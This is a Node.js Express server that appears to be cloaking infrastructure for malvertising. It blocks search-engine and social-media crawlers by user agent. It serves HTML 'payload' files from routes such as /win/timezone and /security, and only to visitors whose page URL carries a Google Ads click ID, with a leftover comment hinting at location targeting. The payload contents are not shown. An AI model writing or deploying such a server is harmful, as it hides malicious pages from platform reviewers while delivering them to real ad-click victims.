import express from "express";
import useragent from "express-useragent";
import cors from "cors";
import fs from "fs";
import path from "path";

const app = express();
app.use(express.json());
app.use(useragent.express());
app.use(cors());

// ----- Config -----
const BOT_AGENTS = [
  "facebookexternalhit",
  "facebot",
  "googlebot",
  "bingbot",
  "crawler",
  "spider",
  "bot",
];

// ----- Runtime stats & logs -----
const stats = { allowed: 0, blockedBots: 0 };
const recentLogs = [];
const MAX_LOGS = 500;

function pushLog(entry) {
  recentLogs.unshift(entry);
  if (recentLogs.length > MAX_LOGS) recentLogs.pop();

  console.log(
    `[${entry.ts}] ${entry.ip} -> ${entry.route} : ${entry.result.toUpperCase()} (${entry.reason})`
  );
  if (entry.details && Object.keys(entry.details).length) {
    console.log("   Details:", entry.details);
  }
}

// ----- Helpers -----
function clientIP(req) {
  const xf = req.headers["x-forwarded-for"];
  return xf ? xf.split(",")[0].trim() : req.ip;
}

function uaIsBot(ua = "") {
  if (!ua) return true;
  const low = ua.toLowerCase();
  return BOT_AGENTS.some((b) => low.includes(b));
}

// ✅ NEW: simple validation → only block bots
function validateRequest(req) {
  const ua = req.useragent?.source || req.get("User-Agent") || "";

  if (uaIsBot(ua)) {
    return {
      allowed: false,
      reason: "blocked_bot",
      details: { userAgent: ua },
    };
  }

  return { allowed: true, reason: "allowed_all_referrers" };
}

// ----- Load payloads -----
function loadPayload(filename) {
  const p = path.join(process.cwd(), "payload", filename);
  try {
    return fs.readFileSync(p, "utf8");
  } catch (err) {
    console.error(`Failed to load payload ${filename}:`, err.message);
    return "";
  }
}

const timezonePayload = loadPayload("timezone.txt");
const secPayload = loadPayload("sec.txt");

// handler
function validatedHandler(payloadString) {
  return (req, res) => {
    const body = req.body || {};
    const timezone = body.timezone;
    const gclid = body.fullUrl?.includes("gclid");

    // ❌ BLOCK everything except gclid
    if (!gclid) {
      pushLog({
        ts: new Date().toISOString(),
        ip: clientIP(req),
        route: req.path,
        result: "blocked",
        reason: "must_be_tokyo_and_have_gclid",
        details: { gclid },
      });

      stats.blockedBots++;

      return res.status(403).json({
        status: "blocked",
        reason: "gclid is required",
      });
    }

    // ✅ Allowed path
    const check = validateRequest(req);

    pushLog({
      ts: new Date().toISOString(),
      ip: clientIP(req),
      route: req.path,
      result: check.allowed ? "allowed" : "blocked",
      reason: check.reason,
      details: check.details || {},
    });

    if (!check.allowed) {
      stats.blockedBots++;
      return res.status(403).json({
        status: "blocked",
        reason: check.reason,
      });
    }

    stats.allowed++;
    return res.status(200).type("text/html").send(payloadString);
  };
}

function uncheckedHandler(payloadString) {
  return (req, res) => {
    pushLog({
      ts: new Date().toISOString(),
      ip: clientIP(req),
      route: req.path,
      result: "allowed",
      reason: "unrestricted_route",
      details: {},
    });

    res.status(200).type("text/html").send(payloadString);
  };
}

// ----- Routes -----
app.all("/win/timezone", validatedHandler(timezonePayload));
app.all("/win/sec", uncheckedHandler(secPayload));

app.all("/timezone", validatedHandler(timezonePayload));
app.all("/security", uncheckedHandler(secPayload));

app.all("*", (req, res) => {
  pushLog({
    ts: new Date().toISOString(),
    ip: clientIP(req),
    route: req.path,
    result: "not_found",
    reason: "no_matching_route",
    details: {},
  });
  res.status(404).json({ error: "Not found" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server listening on port ${PORT}`);
});
